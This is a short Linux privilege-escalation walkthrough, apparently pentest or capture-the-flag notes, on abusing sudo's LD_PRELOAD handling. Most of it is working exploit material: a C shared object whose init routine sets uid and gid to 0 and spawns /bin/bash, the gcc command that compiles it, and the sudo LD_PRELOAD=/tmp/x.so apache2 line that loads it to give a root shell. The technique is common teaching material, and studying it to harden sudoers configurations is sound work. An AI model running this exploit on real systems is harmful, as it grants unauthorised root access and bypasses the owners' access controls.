#### Detection
**Victim's Machine**
```
sudo -l
```

#### Exploitation
**Victim's Machine**
Open a text editor and type:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

Save the file as `x.c`

##### Compile the C into a Shared Object
```
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
```
- `gcc`: The GNU compiler collection
- `-fPIC`: Generates position-independent code, which is necessary for shared libraries.
- `-shared`: Creates a shared object '.so' file.
- `-o /tmp/x.so`: output file.
- `x.c`: The source file containing the code.
- `-nostartfiles`: Prevents linking the standard startup files, which may be necessary for certain shared libraries.

##### Preload the Shared Object with `sudo`
```
sudo LD_PRELOAD=/tmp/x.so apache2
```
- `LD_PRELOAD=/tmp/x.so`: The **LD_PRELOAD** environment variable specifies a shared library `/tmp/x.so` to be loaded before any other shared libraries when executing a program.
- `apache2`: The program to execute with the preloaded shared library.

By setting `LD_PRELOAD` to the path of the malicious shared library `/tmp/x.so`, the ***attacker forces the apache2 process to load this library before its own libraries***. This allows the injected code to execute with the elevated privileges granted by `sudo`.